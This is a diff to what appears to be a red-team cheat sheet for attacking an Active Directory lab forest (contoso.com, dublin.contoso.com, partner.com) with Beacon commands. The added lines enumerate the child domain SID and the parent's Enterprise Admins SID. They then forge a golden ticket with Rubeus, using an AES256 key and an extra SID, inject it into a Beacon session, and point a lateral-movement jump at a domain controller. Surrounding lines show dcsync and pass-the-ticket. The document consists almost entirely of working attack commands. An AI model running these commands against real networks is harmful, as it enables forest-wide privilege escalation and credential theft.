@@ -194,7 +194,15 @@ ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --
 ```cs
 ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
 ```
->Enumerate members of the group 'Partner Jump Users'.
+>Obtain the domain SID for the child domain in the forest.
+```
+ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
+```
+>Obtain the SID for parent domain's Enterprise Admins group.  
+```
+ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
+```
+>Enumerate members of the group `Partner Jump Users`.  
 ```cs
 ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
 ```
@@ -210,7 +218,7 @@ ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*
 ```cs
 ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
 ```
->Enumerate domain inbound or outbound trust  
+>Enumerate parent child trusts - domain inbound or outbound trust  
 ```
 ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
 ```
@@ -406,6 +414,10 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Admi
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TGT]
 ```
+>Exploitation On the Attacker Desktop, forge a golden ticket and output to a kirbi file.  
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
+```
 
 ## kerberos_ticket_use
 
@@ -424,6 +436,10 @@ jump winrm64 par-jmp-1.partner.com smb
 >Inject CIFS ticket and verify  
 ```cs
 kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_cifs.kirbi
+```
+>Golden Ticket, Inject the ticket into the Beacon session replacing the current TGT for sguest.  
+```
+kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET].kirbi
 ```
 
 ## PowerPick  
@@ -671,7 +687,7 @@ dcsync contoso.com CONTOSO\rsteel
 >Preferred JUMP method, `scshell64` uses the service binary payload, be sure to set the `ak-settings spawnto_x64` before JUMP.  
 ```
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
-jump scshell64 lon-ws-1 smb
+jump scshell64 lon-dc-1 smb
 ```
 >Jump to target with WinRM, no service modification, no disk write  
 >Using WinRM to create new beacon  
